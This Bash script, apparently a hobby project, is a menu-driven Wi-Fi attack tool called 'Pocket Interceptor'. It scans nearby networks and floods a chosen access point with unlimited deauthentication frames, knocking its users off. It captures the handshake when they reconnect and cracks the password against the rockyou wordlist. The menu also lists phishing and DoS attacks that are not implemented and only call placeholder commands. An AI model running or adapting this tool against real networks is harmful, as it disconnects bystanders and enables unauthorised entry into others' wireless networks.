#!/bin/bash
intro(){
    clear
    echo "________            ______      _____"                                
    echo "___  __ \______________  /________  /_    "                           
    echo "__  /_/ /  __ \  ___/_  //_/  _ \  __/"                               
    echo "_  ____// /_/ / /__ _  ,<  /  __/ /_"                                 
    echo "/_/     \____/\___/ /_/|_| \___/\__/"                                 
    echo""                                                                     
    echo""                                                                     
    echo""                                                                     
    echo "________                             "                                
    echo "_/_____/                              "                               
    echo""                                                                     
    echo""                                                                                                                                    
    echo "________      _____                               _____              "
    echo "____  _/________  /_________________________________  /______________"
    echo " __  / __  __ \  __/  _ \_  ___/  ___/  _ \__  __ \  __/  __ \_  ___/"
    echo "__/ /  _  / / / /_ /  __/  /   / /__ /  __/_  /_/ / /_ / /_/ /  /    "
    echo "/___/  /_/ /_/\__/ \___//_/    \___/ \___/_  .___/\__/ \____//_/     "
    echo "                                          /_/                        "
    sleep 5
}



SELECTED_INTERFACE=""
MON_INTERFACE=""

DIRECTORTY=`pwd`

select_interface(){    
    clear

    # Obtener lista de interfaces de red disponibles
    INTERFACES=($(ip -o link show | awk -F': ' '{print $2}'))

     #Verifica si tiene interfaces activas
    if [ ${#INTERFACES[@]} -lt 1 ]; then
    echo "There's no active interfaces."
    exit 1
    fi

    # Mostrar las interfaces disponibles
    echo "Select a network interface:"
    for i in "${!INTERFACES[@]}"; do
        echo "$((i+1)). ${INTERFACES[i]}"
    done

    # Leer la selección del usuario
    read -p "Enter the interface wanted: " CHOICE

    # Validar la entrada
    if [[ ! "$CHOICE" =~ ^[0-9]+$ ]] || ((CHOICE < 1 || CHOICE > ${#INTERFACES[@]})); then
        echo "Selected interface not valid."
        exit 1
    fi

    # Obtener la interfaz seleccionada
    SELECTED_INTERFACE="${INTERFACES[CHOICE-1]}"

    if echo "$SELECTED_INTERFACE" | grep -q "mon"; then
        MON_INTERFACE=$SELECTED_INTERFACE
        
    fi

    
    if iwconfig "$SELECTED_INTERFACE" &>/dev/null; then
        echo "[✓] It's a wireless interface $SELECTED_INTERFACE"
    else
        echo "[✗] It isn't a wireless interface"
        exit 1
    fi
    
    SELECTED_INTERFACE="${SELECTED_INTERFACE//mon/}"
    sleep 2
}

WIDTH=""
HEIGHT=""
CAL_WIDTH=""
CAL_HEIGHT=""
get_screen_resolution() {
    if command -v xrandr &>/dev/null; then
        resolution=$(xrandr --current | grep '*' | awk '{print $1}')
        if [[ -n "$resolution" ]]; then
            WIDTH=$(echo "$resolution" | cut -d'x' -f1)
            HEIGHT=$(echo "$resolution" | cut -d'x' -f2)
        else
            return 1
        fi
    else
        return 1
    fi

    CAL_WIDTH=$(( WIDTH / 3 ))
    CAL_HEIGHT=$(( HEIGHT / 3 ))
    return 0
}

open_terminal() {
    local COMMAND_RUN="$1"
    local SCREEN_SITE="$2"
    #Se crea una ID falso para que se puede indentificar cada terminal abierta
    local TERMINAL_TITLE="term_$(date +%s)_$RANDOM" 

    # Abrir terminal en segundo plano
    x-terminal-emulator -title "$TERMINAL_TITLE" -e "$COMMAND_RUN" &

    # Esperar que la terminal se inicie
    sleep 1

    # Obtener ID del proceso del terminal


    # Obtener ID de la ventana asociada al proceso
    WINDOW_ID=$(wmctrl -l | grep "$TERMINAL_TITLE" | awk '{print $1}')

    # Mover y redimensionar la terminal
    if [[ -n "$WINDOW_ID" ]]; then
        case "$SCREEN_SITE" in
            "1") wmctrl -i -r "$WINDOW_ID" -e "0,0,0,$CAL_WIDTH,$CAL_HEIGHT" ;;   # Arriba Izquierda
            "2") wmctrl -i -r "$WINDOW_ID" -e "0,$((WIDTH - CAL_WIDTH)),0,$CAL_WIDTH,$CAL_HEIGHT" ;; # Arriba Derecha
            "3") wmctrl -i -r "$WINDOW_ID" -e "0,0,$((HEIGHT - CAL_HEIGHT)),$CAL_WIDTH,$CAL_HEIGHT" ;; # Abajo Izquierda
            "4") wmctrl -i -r "$WINDOW_ID" -e "0,$((WIDTH - CAL_WIDTH)),$((HEIGHT - CAL_HEIGHT)),$CAL_WIDTH,$CAL_HEIGHT" ;; # Abajo Derecha
            *) echo "ERROR: Posición inválida" ;;
        esac
    else
        echo "No se pudo encontrar la ventana de la terminal."
    fi
}
#Hago unas variables globales para que poder decidir el tamaño 
UP_LEFT="1"
UP_RIGHT="2"
DOWN_LEFT="3"
DOWN_RIGHT="4"

monitor_mode(){

    if echo "$SELECTED_INTERFACE" | grep -q "mon"; then
        MON_INTERFACE=$SELECTED_INTERFACE
        echo "It's already in monitor mode"
        SELECTED_INTERFACE="${SELECTED_INTERFACE//mon/}"
        sleep 2

    else
        echo "[+] Activating monitor mode in $SELECTED_INTERFACE..."
        sudo airmon-ng start "$SELECTED_INTERFACE" &>/dev/null
        
        # Verificar si la interfaz en modo monitor se creó
        MON_INTERFACE="${SELECTED_INTERFACE}mon"
        if iwconfig "$MON_INTERFACE" &>/dev/null; then
            echo "[✓] Monitor mode activated in $MON_INTERFACE"
        else
            echo "[✗] Error: Monitor mode could not be activated"
            exit 1
        fi
        sleep 2
    fi
    
    
}

manager_mode(){
    
    if echo "$MON_INTERFACE" | grep -q "mon"; then
        echo "[+] Disabling monitor mode in $MON_INTERFACE..."
        
        sudo airmon-ng stop "$MON_INTERFACE" &>/dev/null

        if iwconfig "$SELECTED_INTERFACE" &>/dev/null; then
            echo "[✓] Manager mode activated in $SELECTED_INTERFACE"
        else
            echo "[✗] Failed to return to management mode"
            exit 1
        fi
        MON_INTERFACE=""
        sleep 2
    else
        echo "The interface is already in monitor mode"
        sleep 2
    fi
}

BSSID_VAR=""
CHANNEL_VAR=""
PRIVACY_VAR=""
CIPHER_VAR=""
AUTH_VAR=""
BEACONS_VAR=""
ESSID_VAR=""

select_wireless(){
    
    if [[ -z "$MON_INTERFACE" ]];then
        echo "Not in monitor mode"
        sleep 2
        return 1    
    fi
        
    TIMEOUT_SCAN="25"
    # Si estamos en un entorno gráfico
    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
        #Verifica si se puede leer la resolución
        if get_screen_resolution ; then
            #Abre una terminal en una determinada posición 
            open_terminal "timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv $MON_INTERFACE --ignore-negative-one --band abg'" "$UP_LEFT"
        else
            # Si no tenemos resulción ejecutaremos una terminal sin determinar la posición ni tamaño.
            x-terminal-emulator -e "timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv $MON_INTERFACE --ignore-negative-one --band abg"
        fi 
    else
        # No hay entorno gráfico, ejecutarlo en la terminal actual
        timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv "$MON_INTERFACE" --ignore-negative-one --band abg
    fi
    
    #Dejamos que se ejecute en segundo plano el escaneo antes de mirar la informacion
    sleep $TIMEOUT_SCAN
    
    if [[ ! -f "./data_collected/network_dump/networks-01.csv" ]];then
        echo "File csv with network not found"
        exit 1
    fi

    cd  ./data_collected/network_dump/
    FILE="networks-01.csv"
    

    CLIENTS=$(sed -n '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$p' "$FILE") # Se debera mirar que clientes estan reconocibles por la cada wifi
    # Eliminar la información del archivo
    sed -i '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$d' "$FILE"

    # Declarar un array vacio
    declare -a NETWORKS

    # Contador de filas (ID)
    COUNT=0

    # Leer el archivo línea por línea usando 'process substitution'
    while IFS=',' read -r BSSID FirstSeen LastSeen Channel Speed Privacy Cipher Auth Power Beacons IV LAN_IP ID_Length ESSID Key; do
    # Solo almacenar hay algun campo con informacion, si todo es vacio no almazenara.
        if [[ -n "$BSSID" && -n "$Channel" && -n "$Privacy" && -n "$Cipher" && -n "$Auth" && -n "$Beacons" && -n "$ESSID" ]]; then
            # Guardar todos los datos en el array (para referencia interna)
            NETWORKS+=("$BSSID,$Channel,$Privacy,$Cipher,$Auth,$Beacons,$ESSID")

            # Formatear solo los datos a mostrar
            LINE=$(printf "%-20s %-18s %-10s %-7s %-10s" "$BSSID" "$ESSID" "$Privacy" "$Beacons" "$Cipher")

            # Mostrar en pantalla
            echo "$COUNT  $LINE"

            # Incrementar el contador
            COUNT=$((COUNT + 1))
        fi
    done < <(tail -n +2 "$FILE")  # Leer desde la segunda línea

    # Solicitar entrada del usuario
    read -p "Enter an ID number to view its information: " USER_ID

    # Mostrar la información correspondiente al ID
    if [[ $USER_ID =~ ^[0-9]+$ ]] && [[ $USER_ID -ge 1 ]] && [[ $USER_ID -lt ${#NETWORKS[@]} ]]; then
        echo "Selected complete information:"
        IFS=',' read -r BSSID Channel Privacy Cipher Auth Beacons ESSID <<< "${NETWORKS[$USER_ID]}"

        BSSID_VAR="$BSSID"
        CHANNEL_VAR="$Channel"
        PRIVACY_VAR="$Privacy"
        CIPHER_VAR="$Cipher"
        AUTH_VAR="$Auth"
        BEACONS_VAR="$Beacons"
        ESSID_VAR="$ESSID"

        echo "$BSSID_VAR $ESSID_VAR"

    else
        echo "invalid ID ."
    fi

    rm $FILE

    cd .. && cd .. # Se ha de cambiar a ruta no absoluta
}


IW_OUTPUT=$(iw list)
check_band_available() {

    BAND="$1"
    BAND_SECTION=$(echo "$IW_OUTPUT" | awk -v band="Band $BAND:" '
        $0 ~ band {flag=1; next}
        /Band / {flag=0}
        flag {print}
    ')

    # Verificar si la banda tiene frecuencias activas
    if echo "$BAND_SECTION" | grep -q "MHz"; then
        echo "✅"
    else
        echo "❌"
    fi
}


Deauther(){

    TIMEOUT="$1"

    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
        # Estamos en un entorno gráfico
        if get_screen_resolution ; then
            ARRIBA_IZQ="1"
            #Abre una terminal en una determinada posición 
            open_terminal "timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE" "$UP_LEFT"
        else
            x-terminal-emulator -e " timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE"
        fi
    else
        # No hay entorno gráfico, ejecutarlo en la terminal actual
        nohup timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &
    fi

}

Bruteforce(){
    
    if [[ -z "$BSSID_VAR" ]];then
        echo "There's not a BSSID in usage"
        sleep 2
        return 1    
    fi

    if [[ -z "$CHANNEL_VAR" ]];then
        echo "There's not a Channel set in usage"
        sleep 2
        return 1    
    fi

    if [[ -z "$MON_INTERFACE" ]];then
        echo "Interface it's not in monitor mode"
        sleep 2
        return 1    
    fi

    USR_INPUT=true
    while $USR_INPUT; do
        read -p "Set a time to run the attack recomended at least 20. MIN 10 MAX 200: " TIMEOUT_USR


        if [[ $TIMEOUT_USR =~ ^[0-9]+$ ]] && [[ $TIMEOUT_USR -ge 10 ]] && [[ $TIMEOUT_USR -lt 200 ]];then
            
            USR_INPUT=false
            #Cambiamos la interface al canal donde esta la red para poder hacer el ataque por el canal donde esta la red wifi.
            iwconfig $MON_INTERFACE channel $CHANNEL_VAR

            if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
                # Estamos en un entorno gráfico
                Deauther "$TIMEOUT_USR" &

                if get_screen_resolution ; then
                    ARRIBA_DER="2"
                    #Abre una terminal en una determinada posición 
                    open_terminal "timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE" "$UP_RIGHT"
                else
                    x-terminal-emulator -e " timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE"
                fi
            else
                # No hay entorno gráfico, ejecutarlo en la terminal actual
                Deauther "$TIMEOUT_USR" &
                nohup timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &

            fi
        
        else
            echo "Invalid Time number"
            return 1
        fi
    done

    sleep $TIMEOUT_USR

    cd data_collected/network_dump

    FILE="wificapture-01.cap"

    if [[ -z $FILE ]];then
        echo "ERROR file not found"
        return 1
    fi
    
    WORDLIST="/usr/share/wordlists/rockyou.txt"

    #OUTPUT=`aircrack-ng $FILE -w $WORDLIST`

    if aircrack-ng $FILE -w $WORDLIST ;then
        echo "FOUND KEYS"
        rm ./*
        exit 0
    else 
        echo "NO FOUND"
        rm ./*
        exit 1
    fi
}

menu(){
   
    if true; then #./install.sh
        select_interface
        clear
    else
        exit 1
    fi
    
    BOOL_SELECTION=true

    while $BOOL_SELECTION; do
        
        if [[ -z "$MON_INTERFACE" ]];then
            
            MODE=$(iwconfig "$SELECTED_INTERFACE" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
            echo "You haved selected the interface: $SELECTED_INTERFACE  in Mode: $MODE"

            BAND_NUMBERS=$(echo "$IW_OUTPUT" | grep -oP "Band \K\d+" | sort -u)

            # Verificar el estado de cada banda
            for number in $BAND_NUMBERS; do
                case $number in
                    1)
                        echo "The interface $SELECTED_INTERFACE has: 2.4 GHz: $(check_band_available $number)"
                        ;;
                    2)
                        echo "The interface $SELECTED_INTERFACE has: 5 GHz: $(check_band_available $number)"
                        ;;
                    4)
                        echo "The interface $SELECTED_INTERFACE has: 6 GHz: $(check_band_available $number)"
                        ;;
                    *)
                        echo "Banda $number: No reconocida"
                        ;;
                esac
            done

        else
            MODE=$(iwconfig "$MON_INTERFACE" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
            echo "You haved selected the interface: $MON_INTERFACE  in Mode: $MODE"
            
            BAND_NUMBERS=$(echo "$IW_OUTPUT" | grep -oP "Band \K\d+" | sort -u)
            # Verificar el estado de cada banda
            for number in $BAND_NUMBERS; do
                case $number in
                    1)
                        echo "The interface $MON_INTERFACE has: 2.4 GHz: $(check_band_available $number)"
                        ;;
                    2)
                        echo "The interface $MON_INTERFACE has: 5 GHz: $(check_band_available $number)"
                        ;;
                    4)
                        echo "The interface $MON_INTERFACE has: 6 GHz: $(check_band_available $number)"
                        ;;
                    *)
                        echo "Banda $number: No reconocida"
                        ;;
                esac
            done
        fi

        if [[ -z "$BSSID_VAR" ]];then
            echo "You don't have any Wireless network selected"
        else
            echo "You have the wireless network $ESSID_VAR selected with the BSSID: $BSSID_VAR with the privacy type: $PRIVACY_VAR"
        fi

        echo ""
        echo "+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+-+"
        echo "|M|e|n|u| |I|n|t|e|r|c|e|p|t|o|r|"
        echo "+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+-+"
        echo ""
        echo "Network Configuration Menu"
        echo "- - - - - - - - - - - - - - - - - -"
        echo "0. Exit Scipt"
        echo "1. Change Network Interface"
        echo "2. Put Interface In Monitor Mode (Needed for wireless atacks)"
        echo "3. Put Interface In Manager Mode "    
        echo "4. Select wireless network "
        echo "- - - - - - - - - - - - - - - - - -"
        echo ""
        echo "Atacks Menu"
        echo "- - - - - - - - - - - - - - - - - -"
        echo "5. Deauther + Bruteforce (Get inside the Wireless network) "
        echo "6. Fake Capcha (Deauther + Ap Spofing + Phishing Login)"
        echo "7. DoS Attack (Stop the wireless conexions)"
        echo "8. Scan Network (Search Devices + Vulnerabilities)"
        echo "9. "
        echo "- - - - - - - - - - - - - - - - - -"
        echo ""
        echo ""
        read -p "Select the option you want: " SELECTION

        case $SELECTION in
            1) select_interface ;;
            2) monitor_mode;;
            3) manager_mode ;;
            4) select_wireless ;;
            5) Bruteforce ;;
            6) echo ""; hostname -I ;;
            7) echo ""; free -h ;;
            8) echo ""; uptime ;;
            9) echo ""; uname -r ;;
            0) echo "👋 Goodbye..."; exit 0 ;;
            *) echo "❌ Not valid option." ; sleep 2 ;;
        esac
    done

}





USERID=`id -u`

if [ $USERID == 0 ];then
    intro
    menu
else
	echo "Not executed as root"
fi
exit 1